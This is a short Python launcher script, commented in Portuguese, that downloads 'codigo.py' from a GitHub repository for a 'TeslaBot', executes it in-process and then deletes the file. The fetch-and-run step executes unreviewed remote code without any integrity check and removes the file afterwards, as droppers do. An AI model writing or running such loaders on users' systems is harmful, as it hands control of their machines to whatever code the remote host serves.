import requests
import importlib.util
import os

def download_file(url, file_path):
    """Baixa um arquivo do URL fornecido e salva no caminho especificado."""
    response = requests.get(url)
    response.raise_for_status()  # Levanta um erro se o download falhar
    with open(file_path, 'wb') as f:
        f.write(response.content)

def execute_script(file_path):
    """Executa o script Python a partir do caminho fornecido."""
    spec = importlib.util.spec_from_file_location("bot_module", file_path)
    bot_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(bot_module)

def main():
    url = 'https://github.com/ZetaChapolin/TeslaBot/raw/main/codigo.py'
    file_path = 'codigo.py'
    
    try:
        # Baixar o arquivo
        print("Baixando o arquivo...")
        download_file(url, file_path)
        print("Arquivo baixado com sucesso.")
        
        # Executar o script
        print("Executando o script...")
        execute_script(file_path)
        print("Script executado com sucesso.")
        
    except Exception as e:
        print(f"Ocorreu um erro: {e}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)  # Remove o arquivo temporário

if __name__ == '__main__':
    main()
